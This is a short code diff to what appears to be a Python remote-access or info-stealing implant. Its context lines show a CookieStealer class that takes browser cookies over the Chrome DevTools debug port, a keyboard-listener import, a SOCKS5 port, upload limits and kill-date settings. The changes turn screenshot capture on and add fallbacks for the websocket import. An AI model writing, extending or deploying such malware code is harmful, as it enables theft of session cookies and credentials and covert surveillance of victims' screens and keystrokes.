@@ -82,8 +82,11 @@ try:
     from pynput import keyboard
     import configparser
     import xml.etree.ElementTree as ET
-    import socketio
-    import websocket
+    import socketio as socketio
+    try:
+        import websocket
+    except ImportError:
+        import websocket_client as websocket
     import tempfile
     import multiprocessing
   
@@ -107,7 +110,7 @@ class Config:
         self.SOCKS5_PORT = 1080
         self.MAX_UPLOAD_SIZE = 10 * 1024 * 1024
         self.DEBUG = True
-        self.TAKE_SCREENSHOTS = False
+        self.TAKE_SCREENSHOTS = True
         self.SCREENSHOT_FREQUENCY = 10
         self.KILLDATE_ENABLED = False
         self.KILLDATE = "" if False else ""
@@ -392,6 +395,7 @@ class CookieStealer:
             pass
 
     def _get_cookies_via_debug(self, port):
+        import websocket 
         """Get cookies using Chrome DevTools Protocol"""
         try:
             debug_url = f'http://localhost:{port}/json'
